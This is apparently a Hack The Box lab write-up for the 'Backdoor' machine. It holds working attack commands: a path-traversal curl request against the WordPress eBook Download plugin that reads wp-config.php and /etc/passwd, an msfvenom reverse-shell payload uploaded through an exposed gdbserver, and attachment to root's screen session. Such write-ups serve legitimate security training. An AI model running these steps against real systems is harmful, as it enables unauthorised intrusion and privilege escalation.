---
layout: post
comments: true
title: "Backdoor HTB WriteUp"
tags: ['hackthebox','screen','wordpress']
---

## Introduction

This an easy linux machine, we can learn how to discover Wordpress plugins, search vulnerabilities on them. Also, we are going to be covering some screen missconfigurations.

## Enumeration

### Nmap

We are going to discover open ports:
```bash
sudo nmap -sC -Pn -n -vvv -p- --min-rate 5000 -oG ports 10.10.11.125
```

We are going to extract the open ports with the getPorts utility.
```bash
getPorts -f ports
```

The open ports that we discovered are:
```
22,80,1337
```

Now we are going to scan the services on this ports:
```bash
sudo nmap -sCV -Pn -n -vvv -p22,80,1337 --min-rate 5000 -oN services 10.10.11.125
```
We have three services running on the machine:
1. Port 22: "OpenSSH 8.2p1"
2. Port 80: "Apache httpd 2.4.41"
3. Port 1337: "waste?"

Waste services is a bit strange. We are going to look forward that.

### Port 1337

In this [link][port1337] we can find common services in the 1337 port.

We can try to grab the banner of the service:
```bash
telnet 10.10.11.125:1337
```
We don't get much...

Also we can try connect with netcat:
```bash
nc 10.10.11.125 1337
```
We don't recieve any response neither...

### Web
If we slightly inspect the web we can found that has been created with WordPress.

We can try to get more info about the web:
```bash
whatwhatweb 10.10.11.125 
```

Output:
```
http://10.10.11.125 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], Email[wordpress@example.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.125], JQuery[3.6.0], MetaGenerator[WordPress 5.8.1], PoweredBy[WordPress], Script, Title[Backdoor &#8211; Real-Life], UncommonHeaders[link], WordPress[5.8.1]
```

We can see that is using 5.8.1 WordPress version.

### Wordpress enumeration

#### wpscan
We can leave WordPress detecting and scanning themes, plugins and wordpress vulnerabilities.
```bash
wpscan --url http://10.10.11.125 -o wpevidence -v --plugins-detection aggressive --enumerate vp,vt
```
Meanwhile wpscann is running we are going to proceed to enumerate the Wordpress manually.

#### Searchsploit 
We will search for common Wordpress 5.8.1 vulnerabities.

```bash
searchsploit "wordpress 5.8.1"
```
Output:
```
WordPress Plugin DZS Videogallery < 8.60 - Multiple Vulne

WordPress Plugin iThemes Security < 7.0.3 - SQL Injection

WordPress Plugin Rest Google Maps < 7.11.18 - SQL Injecti
```
If these plugins are used on the sit probably probably we had an entry point.

#### Google search
We are going to keep searching for Wordpress 5.8.1 vulnerabities.
At this [link][wordpress5.8.1vuln] we can get some vulnerabilities that we can explore later.

#### Manual WordPress enumeration
Following this [HackTricks guide][] we are going to enumerate all the website manually.

* We can found a login at *wp-login.php*

* *wp-content* Folder seems to return nothing, but *wp-content/uploads/* return us all the files.

Since we can't see all the stuff that *wp-content* show us we will search for the common directories inside it.
These are:
1. themes
2. plugins
3. uploads
4. index.php

As we try some paths we discover some directories we found that  *wp-content/plugins* exist and we found one plugin called "ebook-download".

We can search for Wordpress eBook plugin vulnerabilities.
```bash
searchsploit "wordpress ebook"
```
Output:
```
WordPress Plugin eBook Download 1.1 - Directory Traversal
.
.
.
```
We had found that the 1.1 ebook version is vulnerable to a Directory Traversal attack.

At */wp-content/plugins/ebook-download/readme.txt* we see the line "Stable tag: 1.1". We can assume that our plugin is running 1.1 version.

We mirror the exploit:
```bash
searchsploit -m 39575
```

If we inspect the file we can find the PoC:
```
/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php
```

If we try to run with curl the PoC:
```bash
curl http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php
```
We got a response!
Now we got a Directory Traversal explotable vulnerability.


### Automatizing Directory Transversal

We created a [bash script][Bash script dt] to dowload and show all the files we want.
We can list users:
```bash
./dt /etc/passwd
```
Output:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
user:x:1000:1000:user:/home/user:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false
```

We can see that a user called user is allocated in the system. We can try to grab the flag.
```bash
./dt /home/user/user.txt
```
Output:
```bash
[-] File /home/user/user.txt not found at 10.10.11.125
```
We dont get much...


We are going to create a [script][Bash script list] to list all the process running at the machine using the script we just created.<br>
We run it: <br>
*Note: The dt.sh and the list_process.sh script have to be in the same directory*
```bash
./list_process.sh 2>/dev/null
```
Output:
```
* Process 1:
         CMD: /sbin/initautoautomatic-ubiquitynoprompt
* Process 487:
         CMD: /lib/systemd/systemd-journald
* Process 515:
         CMD: /lib/systemd/systemd-udevd
* Process 538:
         CMD: /lib/systemd/systemd-networkd
* Process 658:
         CMD: /sbin/multipathd-d-s
* Process 659:
         CMD: /sbin/multipathd-d-s
* Process 660:
         CMD: /sbin/multipathd-d-s
* Process 661:
         CMD: /sbin/multipathd-d-s
* Process 662:
         CMD: /sbin/multipathd-d-s
* Process 663:
         CMD: /sbin/multipathd-d-s
* Process 664:
         CMD: /sbin/multipathd-d-s
* Process 684:
         CMD: /lib/systemd/systemd-resolved
* Process 686:
         CMD: /lib/systemd/systemd-timesyncd
* Process 709:
         CMD: /usr/bin/VGAuthService
* Process 711:
         CMD: /usr/bin/vmtoolsd
* Process 753:
         CMD: /usr/bin/vmtoolsd
* Process 754:
         CMD: /usr/bin/vmtoolsd
* Process 756:
         CMD: /usr/bin/vmtoolsd
* Process 772:
         CMD: /lib/systemd/systemd-timesyncd
* Process 789:
         CMD: /usr/lib/accountsservice/accounts-daemon
* Process 790:
         CMD: /usr/bin/dbus-daemon--system--address=systemd:--nofork--nopidfile--systemd-activation--syslog-only
* Process 792:
         CMD: /usr/lib/accountsservice/accounts-daemon
* Process 797:
         CMD: /usr/sbin/irqbalance--foreground
* Process 798:
         CMD: /usr/bin/python3/usr/bin/networkd-dispatcher--run-startup-triggers
* Process 801:
         CMD: /usr/sbin/irqbalance--foreground
* Process 802:
         CMD: /usr/sbin/rsyslogd-n-iNONE
* Process 803:
         CMD: /lib/systemd/systemd-logind
* Process 805:
         CMD: /usr/sbin/rsyslogd-n-iNONE
* Process 806:
         CMD: /usr/sbin/rsyslogd-n-iNONE
* Process 807:
         CMD: /usr/sbin/rsyslogd-n-iNONE
* Process 827:
         CMD: /usr/sbin/cron-f
* Process 829:
         CMD: /usr/sbin/CRON-f
* Process 830:
         CMD: /usr/sbin/CRON-f
* Process 851:
         CMD: /bin/sh-cwhile true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root \;; done
* Process 859:
         CMD: /usr/sbin/atd-f
* Process 860:
         CMD: /bin/sh-cwhile true;do su user -c "cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;"; done
* Process 861:
         CMD: suuser-ccd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;
* Process 868:
         CMD: sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
* Process 878:
         CMD: /usr/sbin/apache2-kstart
* Process 933:
         CMD: /usr/lib/accountsservice/accounts-daemon
* Process 937:
         CMD: /sbin/agetty-o-p -- \u--nocleartty1linux
* Process 950:
         CMD: SCREEN-dmSroot
* Process 955:
         CMD: -/bin/bash
* Process 960:
         CMD: /usr/lib/policykit-1/polkitd--no-debug
* Process 968:
         CMD: /lib/systemd/systemd--user
* Process 969:
         CMD: /usr/lib/policykit-1/polkitd--no-debug
* Process 973:
         CMD: /usr/lib/policykit-1/polkitd--no-debug
* Process 974:
         CMD: /usr/sbin/mysqld
* Process 975:
         CMD: (sd-pam)
* Process 990:
         CMD: /usr/sbin/apache2-kstart
* Process 991:
         CMD: /usr/sbin/apache2-kstart
* Process 993:
         CMD: /usr/sbin/apache2-kstart
* Process 994:
         CMD: bash-ccd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;
* Process 995:
         CMD: gdbserver--once0.0.0.0:1337/bin/true
* Process 999:
         CMD: /bin/true
* Process 1000:
         CMD: /usr/sbin/apache2-kstart
```

We can see a bunch of process in the machine.
We can notice the a gbd server is running on the 1337 port.

We can google search about this process. In this [HackTricks Post][HackTricks GdbServer] they explain us how to pentest and exploit this service.


### Gaining User Access

First we are going to set up a reverse shell at 4444:
```bash
nc -lvnp 4444
```

Second, we are going to follow the steps posted in the [guide][HackTricks GdbServer]:
```bash
# Trick shared by @B1n4rySh4d0w
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$TUN0_IP LPORT=4444 PrependFork=true -f elf -o binary.elf

chmod +x binary.elf

gdb binary.elf

# Set remote debuger target
target extended-remote $MACHINE_IP:1337

# Upload elf file
remote put binary.elf binary.elf

# Set remote executable file
set remote exec-file /home/user/binary.elf

# Execute reverse shell executable
run

# You should get your reverse-shell
```
POUM!<BR>
Now we got a shell as *user*.
```bash
whoami
user
```

We can capture the user flag.
```bash
cd
cat user.txt
```


### Privilege Escalation

#### Upgrading the shell
We can upgrade the shell:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

#### Identifiying screen missconfiguration
In the process that we list above, we also can see a [screen][screen man] process.

A screen can be attached if multi-user is enabled.

To list the screen a user is running, just run the command
```bash
screen -ls $USER/
```

If we try this for root:
```bash
screen -ls root/
```
Output:
```
There is a suitable screen on:
        952.root        (09/07/22 17:31:21)     (Multi, detached)
1 Socket in /run/screen/S-root.
```

We can see that root user is running a screen called root and it's suitable for us.
We can attatch to it.

```bash
screen -r root/root
```
POUM!💣
Now we are inside root user and we can capture the flag.


Thank's all for reading!📙

[screen man]: https://linux.die.net/man/1/screen

[Bash script dt]: https://github.com/isuckatlinux/htbmachines/blob/main/backdoor/exploits/dt.sh
[Bash script list]: https://github.com/isuckatlinux/htbmachines/blob/main/backdoor/exploits/list_process.sh

[HackTricks guide]: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress
[HackTricks GdbServer]: https://book.hacktricks.xyz/network-services-pentesting/pentesting-remote-gdbserver


[wordpress5.8.1vuln]: https://wpscan.com/wordpress/581

[port1337]: https://www.speedguide.net/port.php?port=1337

